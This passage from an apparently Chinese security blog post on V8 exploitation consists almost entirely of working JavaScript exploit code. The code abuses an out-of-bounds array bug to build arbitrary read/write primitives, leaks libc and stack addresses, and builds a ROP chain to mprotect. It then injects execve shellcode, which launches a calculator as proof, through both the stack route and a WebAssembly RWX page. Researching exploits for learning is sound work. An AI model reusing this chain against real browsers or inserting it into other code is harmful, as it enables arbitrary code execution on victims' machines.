wr=<span class="keyword">new</span> ArbitraryRW();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> heap=wr.leak()-<span class="number">0x10</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]leak backing store address=&quot;</span>+hex(heap));</span><br><span class="line"></span><br><span class="line">chunk=heap;</span><br><span class="line"><span class="keyword">let</span> size=wr.read(chunk+<span class="number">8</span>);</span><br><span class="line">size=<span class="built_in">parseInt</span>(size/<span class="number">8</span>)*<span class="number">8</span>;</span><br><span class="line"><span class="keyword">let</span> finded=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x5000</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//let leak=wr.read(heap);</span></span><br><span class="line">	prev_size=wr.read(chunk);</span><br><span class="line">	size=wr.read(chunk+<span class="number">8</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(size !== <span class="number">0</span> &amp;&amp; size % <span class="number">2</span> === <span class="number">0</span> &amp;&amp; prev_size &lt;= <span class="number">0x3f0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">let</span> tmp_ptr=chunk-prev_size;</span><br><span class="line">	fd=wr.read(tmp_ptr+<span class="number">0x10</span>);</span><br><span class="line">	bk=wr.read(tmp_ptr+<span class="number">0x18</span>);</span><br><span class="line">	<span class="built_in">console</span>.log(hex(chunk)+<span class="string">&quot;-&gt;&quot;</span>+hex(prev_size));</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">parseInt</span>(fd/<span class="number">0x10000000000</span>)===<span class="number">0x7f</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">&quot;[*]leak unsort bin(fd)&quot;</span>);</span><br><span class="line">		finded=fd;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">break</span>;	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">parseInt</span>(bk/<span class="number">0x10000000000</span>)===<span class="number">0x7f</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">&quot;[*]leak unsort bin(bk)&quot;</span>);</span><br><span class="line">		<span class="built_in">console</span>.log(hex(bk));</span><br><span class="line">		<span class="keyword">break</span>;	</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(size&lt;<span class="number">0x20</span>)&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">	</span><br><span class="line">	size=<span class="built_in">parseInt</span>(size/<span class="number">8</span>)*<span class="number">8</span>;</span><br><span class="line">	chunk+=size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(finded!==<span class="number">0</span>)</span><br><span class="line">&#123;	</span><br><span class="line">	libc_base=<span class="built_in">parseInt</span>(finded/<span class="number">0x100</span>)*<span class="number">0x100</span>-<span class="number">0x3c3b00</span>;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&quot;libc_base=&quot;</span>+hex(libc_base));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&quot;Error when leak libc base!Try Again.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PUSH SHELLCODE</span></span><br><span class="line"><span class="keyword">let</span> shellcode=<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">4096</span>);</span><br><span class="line"><span class="keyword">let</span> shellcode_addr=wr.leak_obj(shellcode);</span><br><span class="line"></span><br><span class="line">ptr=wr.read(shellcode_addr+<span class="number">0x18</span>)-<span class="number">1</span>;</span><br><span class="line">shellcode_addr=wr.read(ptr+<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">console</span>.log(hex(shellcode_addr));</span><br><span class="line"><span class="keyword">let</span> sc=[<span class="number">0x6a</span>,<span class="number">0x3b</span>,<span class="number">0x58</span>,<span class="number">0x99</span>,<span class="number">0x48</span>,<span class="number">0xbb</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x52</span>,<span class="number">0xe8</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x3d</span>,<span class="number">0x3a</span>,<span class="number">0x30</span>,<span class="number">0x20</span>,<span class="number">0x67</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x0f</span>,<span class="number">0x05</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;sc.length;i++)&#123;</span><br><span class="line">	shellcode[i]=sc[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ROP</span></span><br><span class="line"><span class="keyword">let</span> pop_rdi=<span class="number">0x21102</span>+libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rsi=<span class="number">0x202e8</span>+libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rdx=<span class="number">0x01b92</span>+libc_base;</span><br><span class="line"><span class="keyword">let</span> retn=<span class="number">0xe9bbb</span>+libc_base;</span><br><span class="line"><span class="keyword">let</span> mprotect=<span class="number">0x100eb0</span>+libc_base;</span><br><span class="line"><span class="keyword">let</span> rop=[</span><br><span class="line">pop_rdi,</span><br><span class="line"><span class="built_in">parseInt</span>(shellcode_addr/<span class="number">0x1000</span>)*<span class="number">0x1000</span>,</span><br><span class="line">pop_rsi,</span><br><span class="line"><span class="number">1024</span>,</span><br><span class="line">pop_rdx,</span><br><span class="line"><span class="number">7</span>,</span><br><span class="line">mprotect,</span><br><span class="line">shellcode_addr</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">//GET STACK_ADDR</span></span><br><span class="line"><span class="keyword">let</span> environ_addr=libc_base+<span class="number">0x3c5f98</span>;</span><br><span class="line"><span class="keyword">let</span> stack_addr=wr.read(environ_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]stack address &quot;</span>+hex(stack_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rop_addr=stack_addr-<span class="number">200</span>*rop.length;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]rop address &quot;</span>+hex(rop_addr))</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;rop.length;i++)</span><br><span class="line">&#123;</span><br><span class="line">	wr.write(rop_addr+i*<span class="number">8</span>,rop[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	wr.write(rop_addr-i*<span class="number">8</span>,retn);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//malloc hook</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">malloc_hook=0x3C3B10+libc_base;</span></span><br><span class="line"><span class="comment">one_gadget=0xf0897+libc_base;</span></span><br><span class="line"><span class="comment">wr.write(malloc_hook,one_gadget);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//oobArray[oobArray.length - 1] = 0x41414141;				//触发crash</span></span><br></pre></td></tr></table></figure>


<h3 id="通过Wasm写入shellcode"><a href="#通过Wasm写入shellcode" class="headerlink" title="通过Wasm写入shellcode"></a>通过Wasm写入shellcode</h3><p>适用情况:任意版本的Linux</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChangeType</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.buf=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">		<span class="built_in">this</span>.f64=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">		<span class="built_in">this</span>.u32=<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">f2i</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.f64[<span class="number">0</span>]=val;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.u32[<span class="number">1</span>]*<span class="number">0x100000000</span>+<span class="built_in">this</span>.u32[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">i2f</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.u32[<span class="number">0</span>]=<span class="built_in">parseInt</span>(val%<span class="number">0x100000000</span>);</span><br><span class="line">		<span class="built_in">this</span>.u32[<span class="number">1</span>]=<span class="built_in">parseInt</span>((val-<span class="built_in">this</span>.u32[<span class="number">0</span>])/<span class="number">0x100000000</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ct=<span class="keyword">new</span> ChangeType(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oobArray = [<span class="number">1.1</span>];  <span class="comment">//float</span></span><br><span class="line"><span class="keyword">let</span> arrays=[];	</span><br><span class="line"><span class="keyword">let</span> objs=[];		<span class="comment">//for leak							</span></span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;			<span class="comment">//8224	</span></span><br><span class="line">	</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> ( </span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    <span class="function"><span class="title">next</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="number">1.1</span>;</span><br><span class="line">	<span class="built_in">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.counter &gt; maxSize) &#123;	 	</span><br><span class="line">	 oobArray.length=<span class="number">1</span>;	<span class="comment">// !=0 void from be huishou by GC,Elements will point to a null pointer</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="keyword">let</span> array=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x512</span>);</span><br><span class="line">	    <span class="keyword">let</span> obj=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">0x1234</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">0x5678</span>&#125;;</span><br><span class="line">	    arrays.push(array);</span><br><span class="line">	    objs.push(obj);</span><br><span class="line">	    <span class="comment">//%DebugPrint(array);	</span></span><br><span class="line">	&#125;		</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> backing_store;</span><br><span class="line"><span class="keyword">let</span> kbitfield;</span><br><span class="line"><span class="keyword">let</span> buf_index;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;=maxSize;i++)&#123;<span class="keyword">let</span> x=oobArray[i]&#125;; <span class="comment">//GC</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//find ArrayBuffer in the shot</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;maxSize;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">let</span> val=ct.f2i(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val===<span class="number">0x51200000000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		backing_store=i+<span class="number">1</span>;</span><br><span class="line">		kbitfield=backing_store+<span class="number">1</span>;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">&quot;[*]find target ArrayBuffer in oobArray number [&quot;</span>+i+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">		oobArray[i]=ct.i2f(<span class="number">0xbeaf00000000</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">&#123;	</span><br><span class="line">	<span class="comment">//console.log(arrays[i].bytelength);</span></span><br><span class="line">	<span class="keyword">if</span>(arrays[i].byteLength===<span class="number">0xbeaf</span>)&#123;</span><br><span class="line">		</span><br><span class="line">	   	<span class="built_in">console</span>.log(<span class="string">&quot;[*]find target ArrayBuffer number [&quot;</span>+i+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">		buf_index=i;	</span><br><span class="line">		<span class="keyword">let</span> tmp=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(arrays[buf_index],<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">		tmp[<span class="number">0</span>]=ct.i2f(<span class="number">0xdeadbeef</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj_index;</span><br><span class="line"><span class="keyword">let</span> obj_offset;</span><br><span class="line"><span class="comment">//find Objects</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;maxSize;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">let</span> val=ct.f2i(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val===<span class="number">0x123400000000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		obj_offset=i;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">&quot;[*]find target objecets in oobArray number [&quot;</span>+i+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">		oobArray[i]=ct.i2f(<span class="number">0x123500000000</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">&#123;	</span><br><span class="line">	<span class="keyword">if</span>(objs[i].a===<span class="number">0x1235</span>)&#123;</span><br><span class="line">	   	<span class="built_in">console</span>.log(<span class="string">&quot;[*]find target objs number [&quot;</span>+i+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">		obj_index=i;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArbitraryRW</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="title">leak_obj</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">		objs[obj_index].a = obj;</span><br><span class="line">		<span class="keyword">return</span> ct.f2i(oobArray[obj_offset]) - <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">read</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">		oobArray[backing_store]=ct.i2f(addr);</span><br><span class="line">		oobArray[kbitfield]=ct.i2f(addr);</span><br><span class="line">		<span class="comment">//console.log(hex(addr));</span></span><br><span class="line">		<span class="comment">//console.log(hex(ct.f2i(oobArray[backing_store])));</span></span><br><span class="line">		<span class="comment">//console.log(hex(ct.f2i(oobArray[kbitfield])));</span></span><br><span class="line">		<span class="keyword">let</span> tmp=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(arrays[buf_index],<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">return</span> ct.f2i(tmp[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">write</span>(<span class="params">addr,value</span>)</span>&#123;</span><br><span class="line">		oobArray[backing_store]=ct.i2f(addr);</span><br><span class="line">		oobArray[kbitfield]=ct.i2f(addr);</span><br><span class="line">		<span class="built_in">this</span>.f64=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(arrays[buf_index],<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">		<span class="built_in">this</span>.f64[<span class="number">0</span>]=ct.i2f(value);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">leak</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> ct.f2i(oobArray[kbitfield]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wr=<span class="keyword">new</span> ArbitraryRW();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> f=wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">%DebugPrint(f);</span><br><span class="line"><span class="keyword">let</span> asm_addr=wr.leak_obj(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]address of asm = &quot;</span>+hex(asm_addr));</span><br><span class="line"><span class="keyword">let</span> sharedInfo =wr.read(asm_addr+<span class="number">0x18</span>)-<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> functionData=wr.read(sharedInfo+<span class="number">0x8</span>)-<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> instanceAddr=<span class="built_in">parseInt</span>(wr.read(functionData+<span class="number">0x70</span>)/<span class="number">0x10000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;functionData addresss =&quot;</span>+hex(functionData));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] RWX address =&quot;</span>+hex(instanceAddr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sc=[<span class="number">0x6a</span>,<span class="number">0x3b</span>,<span class="number">0x58</span>,<span class="number">0x99</span>,<span class="number">0x48</span>,<span class="number">0xbb</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x68</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x52</span>,<span class="number">0xe8</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x44</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x3d</span>,<span class="number">0x3a</span>,<span class="number">0x30</span>,<span class="number">0x20</span>,<span class="number">0x67</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x56</span>,<span class="number">0x57</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x0f</span>,<span class="number">0x05</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;sc.length;i++)&#123;</span><br><span class="line">	wr.write(instanceAddr+i,sc[i]);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Migraine殇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://migraine-sudo.github.io/2020/02/22/roll-a-v8/">https://migraine-sudo.github.io/2020/02/22/roll-a-v8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://migraine-sudo.github.io" target="_blank">Migraine殇</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Exploit/">Exploit</a></div><div class="post_share"><div class="social-share" data-image="/img/tJBFnf.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/03/14/kernel-pwn/"><img class="prev-cover" src="/img/g3PvYJ.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">kernel pwn 入门-BabyDriver</div></div></a></div><div class="next-post 